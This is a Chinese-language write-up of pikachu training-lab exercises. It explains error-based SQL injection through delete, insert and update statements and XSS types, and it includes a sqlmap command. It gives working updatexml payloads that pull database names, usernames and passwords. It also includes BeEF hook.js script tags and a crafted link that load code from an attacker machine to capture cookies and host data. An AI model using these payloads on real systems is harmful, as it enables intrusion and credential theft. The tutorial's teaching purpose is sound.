<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p>可以先看一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109161907927.png" alt="image-20230109161907927"></p>
<p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分</p>
<h5 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h5><p>rand()函数可以用来生成0和1之间的随机数，但是rand(0)和rand()有本质区别</p>
<p>rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成</p>
<p>rand()生成的数字是完全随机的，而rand(0)是有规律的生成，我们可以在数据库中尝试一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure>

<p>结果每次都不一样</p>
<p><img src="/images%5Cimage-20230109162133611.png" alt=" "></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select rand(0);</span><br></pre></td></tr></table></figure>

<p>结果不会有变化</p>
<p><img src="/images%5Cimage-20230109162031881.png" alt="image-20230109162031881"></p>
<p>配合floor()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select floor(rand(0)) from user;</span><br><span class="line"></span><br><span class="line">select floor(rand(0)*2) from user;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109162542325.png" alt="image-20230109162542325"></p>
<p>很显然rand(0)是伪随机的，有规律可循，这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，同样rand(n)都一样，这样每次注入都会报错，而rand()则需要碰运气了</p>
<p>输出多少看from的表有几列，每一列都会输出一个floor(rand(0))</p>
<h5 id="count"><a href="#count" class="headerlink" title="count(*)"></a>count(*)</h5><p>count(*)，这是一个聚合函数，返回值的数目，它与count()的区别是它不排除NULL</p>
<h5 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h5><p>floor()报错注入需要配合group by</p>
<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sex,count(*) from member group by sex;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109164120043.png" alt="image-20230109164120043"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat(floor(rand(0)*2),(select user()))x from member group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109165251841.png" alt="image-20230109165251841"></p>
<p>group by在执行时，会依次取出查询表中的记录并创建一个临时表，group by的对象便是该临时表的主键。如果临时表中已经存在该主键，则将count(*)值加1，如果不存在，则将该主键插入到临时表中，注意是插入！查询前创建的空临时表。 </p>
<p>那就产生了一个问题</p>
<p>floor(rand(0)*2不是0就是1，当插入了临时表后，为什么不是count(*)加1，而是报错</p>
<p>因为还有一个最重要的特性，就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次(已经是决定插入，但再计算一遍值)，就是这个特性导致了主键重复并报错。</p>
<p>我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),username from users group by username;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230224093155425.png" alt="image-20230224093155425"></p>
<p>上述命令会以username作为主键</p>
<p>按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*),concat(user(),floor(rand(0)*2))x from users group by x;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230224094415861.png" alt="image-20230224094415861"></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>上述是比较常见的几种报错注入</p>
<p>其余的报错注入利用可参考</p>
<p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>由于是delete注入，抓取删除的数据包</p>
<p><img src="/images%5Cimage-20230109224454398.png" alt="image-20230109224454398"></p>
<p>delete语法</p>
<p><img src="/images%5Cimage-20230109224541248.png" alt="image-20230109224541248"></p>
<p>源码大概类似为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from 表名 where id=57</span><br></pre></td></tr></table></figure>

<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><p>由于可控的位置在where后面，无法直接通过union select输出内容</p>
<p>利用报错注入</p>
<h5 id="获取数据库-2"><a href="#获取数据库-2" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109224846408.png" alt="image-20230109224846408"></p>
<h5 id="获取字段值-2"><a href="#获取字段值-2" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1),&#x27;.&#x27;),1)</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109225205208.png" alt="image-20230109225205208"></p>
<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>先自己注册一个账号</p>
<p><img src="/images%5Cimage-20230109151523594.png" alt="image-20230109151523594"></p>
<p>insert和update都是更新数据库的关键词，由此可以判断注入应该存在于注册阶段</p>
<p><img src="/images%5Cimage-20230109151801590.png" alt="image-20230109151801590"></p>
<p>抓取数据包</p>
<p><img src="/images%5Cimage-20230109151855923.png" alt="image-20230109151855923"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109153408606.png" alt="image-20230109153408606"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=test&#x27;,&#x27;123&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;)%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109153447170.png" alt="image-20230109153447170"></p>
<p>可以判断大致源码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into 表名(用户名,密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</span><br></pre></td></tr></table></figure>

<p>因为这里没有回显，需要用到报错注入</p>
<p>insert into 表名(‘a’ and updatexml(1,concat(‘.’,(select database()),’~’),1) ,’密码,性别,电话,地址,住址) values(数据1,数据2,数据3,数据4,数据5,数据6);</p>
<h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><p>相关报错注入的前置知识在《报错注入前置知识》中</p>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109171528855.png" alt="image-20230109171528855"></p>
<p>这里不用0x7e(~)也行，可以用’.’替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109220259851.png" alt="image-20230109220259851"></p>
<p>构造后的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>把主要部分提出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">values(&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p>可以看出来username其实为一个or语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;a&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>可以做一个测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1 or 2,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201349029.png" alt="image-20230109201349029"></p>
<p>or(或)，当前面为真时则只执行前面的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(0 and 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201644077.png" alt="image-20230109201644077"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(0 or 1,&quot;root&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109201838975.png" alt="image-20230109201838975"></p>
<p>可以看到这里是一个类似bool的判断，为真则为1，为假(0)则为0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1 or &quot;haha&quot;,&#x27;root&#x27; );</span><br></pre></td></tr></table></figure>

<p>如果是字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or &#x27;&#x27;  );</span><br><span class="line">insert into test(id,name) values(1,&#x27;&#x27; or null  );</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109210800957.png" alt="image-20230109210800957"></p>
<p>后续可以自己尝试</p>
<p>放入payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into test(id,name) values(1,updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109210927245.png" alt="image-20230109210927245"></p>
<h3 id="获取数据表名"><a href="#获取数据表名" class="headerlink" title="获取数据表名"></a>获取数据表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="group-concat-1"><a href="#group-concat-1" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>group_concat看起来和concat很像，其实差蛮多</p>
<p>group_concat可以将某一列所有的值，拼接成一个字符串</p>
<p>而concat如果参数是某一列字符串，输出的还是某一列</p>
<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109213909438.png" alt="image-20230109213909438"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat(id,&quot;test&quot;) from test; </span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109213937383.png" alt="image-20230109213937383"></p>
<p>这两函数用哪一个，完全看场景(正常注入group_concat较多，盲注中会存在cancat)</p>
<p>当只需要一个字符串时，用group_concat</p>
<h5 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h5><p>可能会遇到数据过长而显示不完全的情况</p>
<p>使用limit限制查询数量，每次查询一条结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>limit和substr的语法类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit m,n</span><br></pre></td></tr></table></figure>

<p>m表示起始位置，n表示读取几行，从第m条记录开始, 返回n条记录 </p>
<h3 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="获取字段值-3"><a href="#获取字段值-3" class="headerlink" title="获取字段值"></a>获取字段值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询用户名</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) or&#x27;</span><br><span class="line"></span><br><span class="line">查询密码</span><br><span class="line">username=a&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>查询密码时最后一位显示不完全，可能是因为长度太长,将~替换为.就可以显示出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=a&#x27; and updatexml(1,concat(&#x27;.&#x27;,(select password from users limit 0,1)),1) or&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="sqlmap-8"><a href="#sqlmap-8" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_iu/sqli_reg.php&quot; --data=&quot;username=admin&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit&quot; -p username --batch</span><br></pre></td></tr></table></figure>

<p><img src="/images%5Cimage-20230109222211826.png" alt="image-20230109222211826"></p>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>登录后修改个人信息</p>
<p><img src="/images%5Cimage-20230109222929316.png" alt="image-20230109222929316"></p>
<p>抓取数据包</p>
<p><img src="/images%5Cimage-20230109223022020.png" alt="image-20230109223022020"></p>
<p>和insert注入的逻辑差不多，无非就是源码上的区别，造闭合，报错注入一把梭就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;</span><br></pre></td></tr></table></figure>

<h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h2><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=nan&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or&#x27;</span><br></pre></td></tr></table></figure>

<p>拼接和insert注入相同，这里就不分析了</p>
<p><img src="/images%5Cimage-20230109224038685.png" alt="image-20230109224038685"></p>
<h5 id="猜字段信息-1"><a href="#猜字段信息-1" class="headerlink" title="猜字段信息"></a>猜字段信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select username from users limit 0,1),&#x27;~&#x27;),1) or &#x27;</span><br><span class="line"></span><br><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 1,1),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-xss</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
    <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
<p>具体来说，XSS攻击有两种类型：存储型XSS和反射型XSS，此外还涉及一种DOM型的XSS。</p>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>指的是将攻击代码存储在网站的数据库中，等待用户访问时自动执行。</p>
<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>指的是将攻击代码作为URL参数的值传递给服务器，服务器将其直接输出到浏览器端，从而在用户的浏览器中执行攻击代码。</p>
<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。与传统的XSS攻击相比，DOM型XSS有一些明显的区别：</p>
<p>1.DOM型XSS不依赖于服务器的输出，因此无需修改服务器端代码来攻击。</p>
<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
<h5 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h5><p>如何辨别一个XSS攻击是否为DOM型XSS呢？下面是几个可以帮助你进行辨别的方法：</p>
<p>1.检查攻击代码是否被服务器端的代码直接输出。如果攻击代码被直接输出，则可能是反射型XSS；如果攻击代码未被直接输出，则可能是DOM型XSS。</p>
<p>2.检查攻击代码是否来自用户的输入。如果攻击代码来自用户的输入，则可能是DOM型XSS；如果攻击代码不是来自用户的输入，则可能是存储型XSS。</p>
<p>3.检查攻击代码是否依赖于浏览器的JavaScript代码执行。如果攻击代码依赖于浏览器的JavaScript代码执行，则可能是DOM型XSS；如果攻击代码不依赖于浏览器的JavaScript代码执行，则可能是存储型XSS。</p>
<h5 id="最基本的payload"><a href="#最基本的payload" class="headerlink" title="最基本的payload"></a>最基本的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>该payload会在浏览器上跳出一个弹窗</p>
<p>xss就是在我们可控的地方放入可解析的代码</p>
<p><img src="/images%5C1660186046326-4d44628a-58c7-457d-90ed-96f14c503504.png" alt="img"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg">https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg</a></p>
<h1 id="BeEF-XSS利用框架安装"><a href="#BeEF-XSS利用框架安装" class="headerlink" title="BeEF XSS利用框架安装"></a>BeEF XSS利用框架安装</h1><p>攻击机使用的是kali系统(免费，可直接下载)</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>

<p>如果提示无法定位软件包，可以先apt-get update后再尝试</p>
<p>如果还是不行，可手动安装</p>
<p><a href="https://beefproject.com/">https://beefproject.com/</a></p>
<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
<p>下载后可能会报毒，不用在意</p>
<p>放置kali后解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install</span><br></pre></td></tr></table></figure>

<p>如果还不行可能和新旧版本的kali有关系</p>
<p>可在其他linux系统安装，这里使用的是ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./beef</span><br></pre></td></tr></table></figure>

<p>第一次运行需要修改密码</p>
<p><img src="/images%5Cimage-20230108165651096.png" alt="image-20230108165651096"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gedit config.yaml</span><br></pre></td></tr></table></figure>

<p>此处更改为自己的用户名密码</p>
<p><img src="/images%5Cimage-20230108165800888.png" alt="image-20230108165800888"></p>
<p>然后登录web界面</p>
<p><img src="/images%5Cimage-20230108170143782.png" alt="image-20230108170143782"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.28.150:3000/ui/authentication</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png"></p>
<p>登录进入后台，用户名为beef</p>
<p><img src="/images%5C1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>beef启动时命令行会给出web页面地址和攻击payload</p>
<p>使用脚本安装的可能没有，自己补全即可</p>
<p><img src="/images%5C1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
<p>payload换上攻击机的ip地址，直接上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
<p>获取访问留言板的电脑的主机信息</p>
<p><img src="/images%5C1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
<p>同样，换个虚拟机发起请求</p>
<p><img src="/images%5C1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
<p>攻击机kali获取到主机信息</p>
<p><img src="/images%5C1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
<p>攻击机获取到主机信息</p>
<p><img src="/images%5C1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
<h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><p>是一种非持久化的xss，即攻击行为在网页刷新后就不存在了(但如果是get请求需要将payload删除)，攻击行为只会发生在客户端，即浏览器，并不会将攻击代码存储到网站服务器中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;test&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可控点在<div>标签里面</p>
<p><img src="/images%5C1662617312740-0ed9d6ef-f86b-42b1-a38f-1e4bacd65d8f.png" alt="img"></p>
<p>直接插入payload</p>
<p><img src="/images%5C1662617482276-c28ec953-08dc-4b2a-b974-786779e9b345.png" alt="img"></p>
<p>反射型xss就是把用户输入的数据“反射”给浏览器，也就是说，用户在访问恶意链接时，才能攻击成功，反射型xss也叫做非持久性xss。</p>
<p>反射型xss需要服务端解析响应参与，但输入的payload并不存储在服务器上。</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>可以f12查看可控点</p>
<p><img src="/images%5C1660476633506-b93b6ac7-2f8c-476c-957e-b738bcea1750.png" alt="img"></p>
<p>xss的验证方法基本上就是拿着payload见框就插</p>
<p>该题首先发现payload压根输不满</p>
<p><img src="/images%5C1660184936621-b04dfb7b-3a7b-4f43-8402-b665448d06e4.png" alt="img"></p>
<p>这里有多种解决方法。</p>
<p>1.f12直接更改前端代码。</p>
<p>将maxlenth字段删除</p>
<p><img src="/images%5C1660185365090-0dcdec0a-d027-4b2f-959b-fabf9b5d6230.png" alt="img"></p>
<p><img src="/images%5C1660185501321-c7b0d245-99a4-4105-b5da-a72d56c0036c.png" alt="img"></p>
<p>2.抓包后修改放包。</p>
<p>抓包后直接修改请求。注意有些情况需要url编码。</p>
<p><img src="/images%5C1660185676861-9595165b-756c-46cc-afb1-ddf2ead09de2.png" alt="img"></p>
<p>3.因为是get请求，可以直接在地址栏修改</p>
<p><img src="/images%5C1660185993458-1c631800-176a-4506-a867-489816d8e492.png" alt="img"></p>
<p>成功弹窗</p>
<p><img src="/images%5C1660185960775-3d08b7c5-6199-44cf-9065-a0c127699488.png" alt="img"></p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post请求即发送的payload并不会显示到url地址栏中，而是放在数据包的body部分</p>
<p><img src="/images%5C1660186338853-0af903af-6785-46b8-9d4c-5af5fdb84308.png" alt="img"></p>
<p>根据提示考察的是通过xss获取cookie，先登录。</p>
<p>首先alert一个弹窗看看是否存在xss</p>
<p><img src="/images%5C1660186626342-0cc88d27-f63f-4f2a-9329-c4027d952498.png" alt="img"></p>
<p>可以看出post类型的反射型xss</p>
<p><img src="/images%5C1660186598976-013e91db-3e38-4995-a190-ae926e8eb50c.png" alt="img"></p>
<p>插入获取cookie的payload</p>
<script>alert(document.cookie)</script>

<h3 id="关于document-cookie"><a href="#关于document-cookie" class="headerlink" title="关于document.cookie"></a>关于document.cookie</h3><p>cookie是用于维持用户登录状态和行为的一个东东，获取到用户的cookie就相当于获取到了用户的用户名和密码。</p>
<p>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</p>
<p>document.cookie可以读取当前cookie</p>
<p><img src="/images%5C1660187377093-761310f5-2c3c-4592-8546-546236b52087.png" alt="img"></p>
<p>成功获取cookie</p>
<p><img src="/images%5C1660186806768-2ad9856c-676a-46a2-b34b-e8f8919fd84a.png" alt="img"></p>
<h3 id="cookie利用"><a href="#cookie利用" class="headerlink" title="cookie利用"></a>cookie利用</h3><p>这里可以体会一下cookie的作用</p>
<p>首先抓包保存登录后的后台路径和cookie值</p>
<p><img src="/images%5C1660188619423-f9acd23a-bf2f-496e-bcac-e579b485d986.png" alt="img"></p>
<p>退出登录，重新对后台路径发起请求，并添加cookie</p>
<p><img src="/images%5C1660188991267-eb771206-5a58-44f3-99df-fa44d9d722dc.png" alt="img"></p>
<p>成功登录</p>
<p><img src="/images%5C1660189006511-4813c1c4-9010-4789-8da6-56a049bc66ab.png" alt="img"></p>
<h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><p>持久型跨站点脚本</p>
<p>持久型主要体现在其xss攻击代码会保存至服务器网站数据库中，所以当存储型xss发生时，所有访问受攻击页面的用户都会受到影响。</p>
<p>可以f12查看可控点</p>
<p><img src="/images%5C1660476725683-a4db4011-7712-44b5-b103-b66429005e53.png" alt="img"></p>
<p>往留言板中插入恶意payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images%5C1660270330674-45d49425-c4f4-4192-b6be-e8ede2722051.png" alt="img"></p>
<p>出现弹窗</p>
<p><img src="/images%5C1660270354073-bda7e2e1-c31f-4596-a317-c39de9586345.png" alt="img"></p>
<p>可以发现已经存储到服务器数据库</p>
<p><img src="/images%5C1660270377285-9b1c3bac-230c-451b-b8bc-165e8fc53a37.png" alt="img"></p>
<p>此时更换一个浏览器再次访问该留言板地址</p>
<p>依然会出现弹窗</p>
<p><img src="/images%5C1660270428509-83838f57-b9c4-456f-8037-5c5b003c1397.png" alt="img"></p>
<p>存储型xss的危害比反射型xss危害大得多，当服务器被植入存储型xss时，可被用来钓鱼，窃取cookie，用户登录凭证等。</p>
<h2 id="存储型xss利用"><a href="#存储型xss利用" class="headerlink" title="存储型xss利用"></a>存储型xss利用</h2><p>这里可以直观的体现一下存储型xss的作用</p>
<p>攻击机使用的是kali系统(免费，可直接下载)</p>
<p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
